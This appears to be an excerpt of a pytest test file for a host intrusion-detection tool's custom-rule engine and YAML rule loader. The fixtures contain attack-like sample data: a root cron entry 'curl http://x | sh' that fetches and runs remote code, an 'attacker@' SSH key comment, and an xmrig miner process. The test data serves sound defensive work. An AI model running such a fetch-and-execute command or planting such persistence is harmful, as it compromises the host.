...
def test_substring_match_on_cron_command():
    rule = _rule(source="cron", match="substring", pattern="curl")
    artifacts = {"cron_entries": [
        {"owner": "root", "run_as": "root", "schedule": "* * * * *",
         "command": "curl http://x | sh", "source": "/etc/cron.d/evil"},
    ]}
    findings = apply_custom_rules([rule], artifacts)
    assert len(findings) == 1
    assert findings[0].artifact_path == "/etc/cron.d/evil"


def test_regex_match_on_ssh_key_comment():
    rule = _rule(source="ssh", match="regex", pattern=r"attacker@")
    artifacts = {"authorized_keys": [
        {"username": "alice", "home": "/home/alice", "key_type": "ssh-rsa",
         "key_data": "AAAAB3", "comment": "attacker@box", "file_mtime": 0.0},
    ]}
    findings = apply_custom_rules([rule], artifacts)
    assert len(findings) == 1
...
def test_unknown_source_yields_nothing():
    # A CustomRule constructed directly (bypassing the loader) with an unknown
    # source must simply produce no items rather than raising.
    rule = _rule(source="kernel")
    assert apply_custom_rules([rule], {"processes": [{"exe": "/tmp/x", "cmdline": "xmrig"}]}) == []


def test_load_custom_rules_rejects_non_mapping_top_level(tmp_path):
    p = tmp_path / "rules.yaml"
    p.write_text("- id: X\n")
...
def test_load_custom_rules_rejects_non_list_rules(tmp_path):
    p = tmp_path / "rules.yaml"
    p.write_text("rules: nope\n")
    with pytest.raises(ValueError, match="must be a list"):
        load_custom_rules(str(p))


def test_load_custom_rules_rejects_non_mapping_entry(tmp_path):
    p = tmp_path / "rules.yaml"
    p.write_text("rules:\n  - just-a-string\n")
...
def test_load_custom_rules_rejects_bad_match_type(tmp_path):
    p = tmp_path / "rules.yaml"
    p.write_text(
        "rules:\n  - id: X\n    severity: HIGH\n    title: t\n"
        "    description: d\n    source: process\n    match: fuzzy\n    pattern: y\n"
...
def test_load_example_rules_file_is_valid():
    example = pathlib.Path(__file__).resolve().parent.parent / "examples" / "custom_rules.yaml"
    rules = load_custom_rules(str(example))
    assert {r.id for r in rules} == {
        "CUSTOM_KNOWN_MINER", "CUSTOM_SUSPICIOUS_CRON_DOWNLOAD", "CUSTOM_BEACON_SUBNET",
    }
